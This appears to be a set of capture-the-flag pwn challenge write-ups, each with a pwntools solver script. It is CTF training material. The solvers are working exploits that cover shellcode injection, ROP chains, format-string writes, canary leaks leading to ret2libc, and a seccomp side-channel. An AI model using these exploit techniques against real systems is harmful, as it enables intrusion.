title: Black Flash
author: r3t0x
description: Jujutsu High's cursed-tool shop is running a Black Flash Sale. Your wallet is weak, the minimum order is absurd, and accounting insists its math is flawless. Surely you can afford nothing.
writeup:
## Solution

The shop multiplies the requested quantity and the 65,536-credit price in a
32-bit unsigned integer. Ordering 65,536 tools satisfies the wholesale minimum,
but the product is exactly `2^32` and wraps to zero. The zero total is below the
100-credit balance, so the approved-payment path prints the flag.

The reference solver only needs to submit `65536` at the quantity prompt.
solver:
from pwn import *
p = process("./main")
p.sendlineafter(b"Quantity: ", b"65536")
print(p.recvall().decode())

title: Grade 4 Technique
author: r3t0x
description: Your cursed technique has finally been approved for live demonstration. The evaluators have lowered their expectations accordingly. Try not to embarrass the CPU.
writeup:
## Solution

The service maps a page with read, write, and execute permissions, copies up to 256
bytes from standard input into it, and calls the mapping directly. There is no
shellcode filter, so ordinary amd64 `execve("/bin/sh")` shellcode is sufficient.

After the shell starts, request `/flag` (or the local `flag.txt`) to recover the
challenge flag.
solver:
from pwn import *

context.arch = "amd64"
p = remote("localhost", 1349)
p.sendafter(b"Technique: ", asm(shellcraft.sh()))
p.recvuntil(b"Evaluation begins. Expectations remain manageable.\n")
p.sendline(b"cat flag.txt")
p.interactive()

title: Return Policy
author: r3t0x
description: Jujutsu High guarantees every trainee returns safely. The guarantee was written by the same people who approved this program.
writeup:
## Solution

`orientation` reads 256 bytes into a 64-byte stack buffer. The saved return
address is 72 bytes from the start of that buffer, and the binary exposes a `win`
function that opens and prints the flag.

Pad to offset 72 and replace the saved return address with `win`. No arguments or
second stage are needed.
solver:
from pwn import *

context.binary = elf = ELF("./main", checksec=False)
p = remote(args.HOST or "localhost", int(args.PORT or 1354))
p.sendlineafter(b"Graduation statement: ", flat({72: elf.sym.win}))
print(p.recvall().decode())

title: Strongest Argument
author: r3t0x
description: Gojo said a strong argument wins every debate. You brought confidence; the CPU is still waiting for an actual value.
writeup:
## Solution

The debate function has the same 72-byte offset to its saved return address, but
`win` only succeeds when its first SysV amd64 argument equals
`0x1337c0decafebabe`. The binary deliberately provides a `pop rdi; ret` gadget.

The complete chain is padding, `pop rdi; ret`, the approved value, and `win`.
This sets `rdi` before transferring control to the flag-printing function.
solver:
from pwn import *

context.binary = elf = ELF("./main", checksec=False)
p = remote(args.HOST or "localhost", int(args.PORT or 1355))
payload = flat(b"A" * 72, elf.sym.pop_rdi_ret, 0x1337c0decafebabe, elf.sym.win)
p.sendlineafter(b"Your argument: ", payload)
print(p.recvall().decode())

title: Forbidden Vocabulary
author: r3t0x
description: Jujutsu High reviewed your technique and declared it completely safe. The review lasted eleven seconds, so naturally nothing can go wrong.
writeup:
## Solution

The submitted shellcode may not contain null, newline, `syscall`, slash, or
`int 0x80` bytes. The destination is still writable and executable, so encode a
normal `execve("/bin/sh")` body with a single-byte XOR key whose encoded form
avoids the banned set.

A short position-independent decoder obtains the encoded body's address with a
call/pop sequence, XORs it back in place, and jumps to it. The reference solver
searches for a safe key and verifies that the complete payload contains no banned
byte before sending it.
solver:
from pwn import *

context.arch = "amd64"
bad = {0x00, 0x0a, 0x0f, 0x05, 0x2f, 0xcd}
body = asm(shellcraft.sh())
key = next(k for k in range(1, 256) if k not in bad and all((b ^ k) not in bad for b in body))
decoder = asm(f"""
    jmp get_body
decode:
    pop rsi
    push rsi
    xor ecx, ecx
    mov cl, {len(body)}
    mov al, {key}
decode_byte:
    xor byte ptr [rsi], al
    inc rsi
    loop decode_byte
    pop rsi
    jmp rsi
get_body:
    call decode
""")
payload = decoder + bytes(b ^ key for b in body)
assert len(payload) <= 192 and not set(payload) & bad

p = remote("localhost", 1350)
p.sendafter(b"Technique: ", payload)
p.recvuntil(b"Approved. The committee remains confidently underqualified.\n")
p.sendline(b"cat flag.txt")
p.interactive()

title: NAH
author: r3t0x
description: Jujutsu High sealed a special-grade cursed object behind its newest barrier. You are a Grade 4 sorcerer with no clearance, no technique, and somehow terminal access. The higher-ups are certain you cannot retrieve it. They are famously competent.
writeup:
## Solution

The service stores the protected descriptor in a `uint8_t`, but later accepts the
requested descriptor as a full integer. Registering 253 dummy objects consumes file
descriptors 3 through 255. Opening the flag next returns descriptor 256, which is
truncated to zero in `protected_fd`.

Request descriptor 256. It is not equal to the stored zero, yet `read(256, ...)`
still targets the real flag descriptor and prints its contents.
solver:
from pwn import *
p = process("./main")
p.send(b"1
" * 253 + b"2
3
256
4
")
print(p.recvall().decode())

title: Read It and Weep
author: r3t0x
description: Jujutsu High prints every complaint exactly as submitted. Your opinion matters almost as much as their memory-safety policy.
writeup:
## Solution

The complaint is passed directly to `printf`, giving a format-string write, and
the binary's writable GOT is available at fixed addresses. At format argument
offset 10, use `fmtstr_payload` to replace the low two bytes of `read@GOT` with
the low two bytes of `win`.

Immediately afterward the program calls `read` for the signature. That GOT call
now enters `win`, which opens and prints the flag.
solver:
from pwn import *

context.binary = elf = ELF("./main", checksec=False)
p = remote(args.HOST or "localhost", int(args.PORT or 1356))
payload = fmtstr_payload(10, {elf.got.read: p16(elf.sym.win & 0xffff)}, write_size="short")
p.sendlineafter(b"Complaint: ", payload)
print(p.recvall().decode())

title: Special Grade Paperwork
author: r3t0x
description: Jujutsu High hired a special-grade security committee and gave it a clipboard. Your data has never been safer, statistically speaking.
writeup:
## Solution

The 64-byte report is followed by alignment padding and the stack canary. The
80-byte preview therefore discloses the canary in bytes 72 through 79. The final
copy then reads 256 bytes into the same buffer, providing a canary-preserving stack
overflow.

Use the first ROP stage to call `puts(puts@GOT)` and return to `main`. Subtract
the bundled libc's `puts` offset from the leak. Repeat the interaction with the
known canary, then return to `system("/bin/sh")` and read the flag.
solver:
from pwn import *

context.binary = elf = ELF("./main", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
io = remote(args.HOST or "localhost", int(args.PORT or 1353))

rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address

io.sendafter(b"Draft: ", b"A" * 64)
io.recvuntil(b"Committee preview:\n")
preview = io.recvn(80)
canary = u64(preview[72:80])

stage_one = flat(
    b"A" * 72,
    canary,
    b"B" * 8,
    ret,
    pop_rdi,
    elf.got.puts,
    elf.plt.puts,
    ret,
    elf.sym.main,
)
io.sendafter(b"Final copy: ", stage_one)
io.recvuntil(b"Filed.\n")
libc.address = u64(io.recvn(6).ljust(8, b"\0")) - libc.sym.puts
io.recvuntil(b"\n")

io.sendafter(b"Draft: ", b"A" * 64)
io.recvuntil(b"Committee preview:\n")
io.recvn(80)

stage_two = flat(
    b"A" * 72,
    canary,
    b"B" * 8,
    ret,
    pop_rdi,
    next(libc.search(b"/bin/sh\0")),
    libc.sym.system,
)
io.sendafter(b"Final copy: ", stage_two)
io.recvuntil(b"Filed.\n")
io.sendline(b"cat /flag")
io.interactive()

title: Infinite Void
author: r3t0x
description: Unlimited knowledge is included. Exporting it requires the premium plan, which your team apparently could not afford.
writeup:
## Solution

The seccomp policy allows `openat`, `read`, and exit calls, but not `write`, so
the flag cannot be returned directly. Shellcode can still open and read `/flag`,
compare one chosen byte with a guess, and conditionally block in an allowed read
from standard input.

An immediate exit means the secret byte is at most the guess; a connection that
remains alive means it is greater. Binary-search printable ASCII with this one-bit
oracle for each position, starting from the known `SecurinetsENIT{` prefix, until
the closing brace is recovered.
solver:
from pwn import *

context.arch = "amd64"
known = b"SecurinetsENIT{"

while known[-1:] != b"}" and len(known) < 80:
    low, high = 32, 126

    while low < high:
        guess = (low + high) // 2
        code = asm(f"""
            sub rsp, 0x100
            mov rbx, 0x67616c662f
            mov qword ptr [rsp], rbx
            mov eax, 257
            mov rdi, -100
            mov rsi, rsp
            xor edx, edx
            xor r10d, r10d
            syscall
            mov edi, eax
            lea rsi, [rsp + 0x20]
            mov edx, 0x80
            xor eax, eax
            syscall
            movzx eax, byte ptr [rsp + 0x20 + {len(known)}]
            cmp eax, {guess}
            jbe done
            xor eax, eax
            xor edi, edi
            lea rsi, [rsp + 0xa0]
            mov edx, 1
            syscall
        done:
            mov eax, 60
            xor edi, edi
            syscall
        """)

        p = remote("localhost", 1351, level="error")
        p.sendafter(b"Technique: ", code)
        p.recvuntil(b"Technique accepted.\n")

        try:
            p.recv(1, timeout=0.2)
        except EOFError:
            pass

        alive = p.connected("recv")

        if alive:
            low = guess + 1
            p.send(b"X")
        else:
            high = guess

        p.close()

    known += bytes([low])
    print(known.decode(), flush=True)

title: Reach Back
author: r3t0x
description:
The secret was already delivered. You just need to remember where the caller left it.

Upload one x86-64 shared object exporting `solve` and make the sandbox print the flag.
writeup:
## Solution

The caller opens the flag before installing seccomp, reads it into its own stack
frame, and then calls the uploaded `solve` function. At `solve` entry the saved
flag buffer begins exactly `0x40` bytes above `rsp`. Although the sandbox blocks
file access, it still permits `write`.

Export a relocation-free `solve` function that writes 128 bytes from
`rsp + 0x40` to standard output and returns. Build it as a shared object and send
one base64 line to the service:

```bash
as --64 -o solve.o solve.s
ld -shared -z noexecstack -o solve.so solve.o
base64 -w0 solve.so | nc pwn.securinets-enit.club 1321
```
solver:
.intel_syntax noprefix

.global solve
.type solve, @function
.section .text
solve:
    lea rsi, [rsp + 0x40]
    mov edi, 1
    mov edx, 0x80
    mov eax, 1
    syscall
    ret
.size solve, .-solve

.section .note.GNU-stack,"",@progbits

author: r3t0x
description: Jujutsu High reviewed your technique twice and certified it completely harmless. Please try to look surprised when the paperwork catches fire.
writeup:
## Solution

Each submitted payload is reversed before it reaches vulnerable `printf`. Reverse
the payload on the client as well, so the intended format string is restored by the
service. During the first inspection, `%74$p|%75$p` leaks the saved frame pointer
and the PIE return address.

Rebase the ELF from the return leak and calculate the saved return-address slot as
`saved_rbp - 0x18`. For the second inspection, create a byte-wise format-string
payload at argument offset 8 that writes the rebased `win` address into that slot,
reverse it for transport, and let the function return.
solver:
from pwn import *

context.binary = elf = ELF("./main", checksec=False)
io = remote(args.HOST or "localhost", int(args.PORT or 1352))

leak = b"%74$p|%75$p"
io.sendlineafter(b"Length: ", str(len(leak)).encode())
io.sendafter(b"Technique: ", leak[::-1])
io.recvuntil(b"Verdict: ")
saved_rbp, return_address = [int(value, 16) for value in io.recvline().strip().split(b"|")]

pie = return_address - (elf.sym.main + 0x80)
saved_rip = saved_rbp - 0x18
payload = fmtstr_payload(8, {saved_rip: pie + elf.sym.win}, write_size="byte")

io.sendlineafter(b"Length: ", str(len(payload)).encode())
io.sendafter(b"Technique: ", payload[::-1])
io.interactive()

title: CALCULUS II
author: r3t0x
writeup:
## Solution

An input containing `"1\0"` remains a valid expression while bytes after the
embedded null overwrite `display_len`. Setting it to 105 makes the octal printer
read nine limbs beyond the 96-limb product array. Decode that octal integer into
32-bit words to recover the stack canary and saved return address, then derive the
PIE base.

An oversized `quit` request makes the calculator return through attacker data.
Preserve the canary and first call `puts(puts@GOT)`, returning to `main` to turn
the leak into a libc base. A second canary-preserving chain calls
`system("/bin/sh")` and reads the flag.
solver:
from pwn import *

context.binary = elf = ELF("./main", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
io = remote(args.HOST or "pwn.securinets-enit.club", int(args.PORT or 1338)) if args.REMOTE else process([ld.path, "--library-path", ".", elf.path])

leak_request = b"1\x00".ljust(0x1000, b"A") + p32(105)
io.sendlineafter(b"Bytes: ", str(len(leak_request)).encode())
io.sendafter(b"Expression: ", leak_request)
io.recvuntil(b"Product: ")
number = int(io.recvline().strip(), 8)
words = [(number >> (32 * index)) & 0xffffffff for index in range(105)]

canary = words[99] | words[100] << 32
saved_rip = words[103] | words[104] << 32
elf.address = saved_rip - (elf.sym.main + 0x80)
pop_rdi = elf.sym.service_record
ret = pop_rdi + 1

stage_one = b"quit\x00".ljust(0x1198, b"A") + flat(
    canary,
    0,
    ret,
    pop_rdi,
    elf.got.puts,
    elf.plt.puts,
    ret,
    elf.sym.main,
)
io.sendlineafter(b"Bytes: ", str(len(stage_one)).encode())
io.sendafter(b"Expression: ", stage_one)

raw_leak = io.recvuntil(b"CALCULUS II\n", drop=True)
libc.address = u64(raw_leak[:-1].ljust(8, b"\x00")) - libc.sym.puts

stage_two = b"quit\x00".ljust(0x1198, b"A") + flat(
    canary,
    0,
    ret,
    pop_rdi,
    next(libc.search(b"/bin/sh\x00")),
    libc.sym.system,
    ret,
    libc.sym.exit,
)
io.sendlineafter(b"Bytes: ", str(len(stage_two)).encode())
io.sendafter(b"Expression: ", stage_two)
io.sendline(b"cat /flag 2>/dev/null || cat flag.txt")
io.recvuntil(b"SecurinetsENIT{")
print((b"SecurinetsENIT{" + io.recvuntil(b"}")).decode())
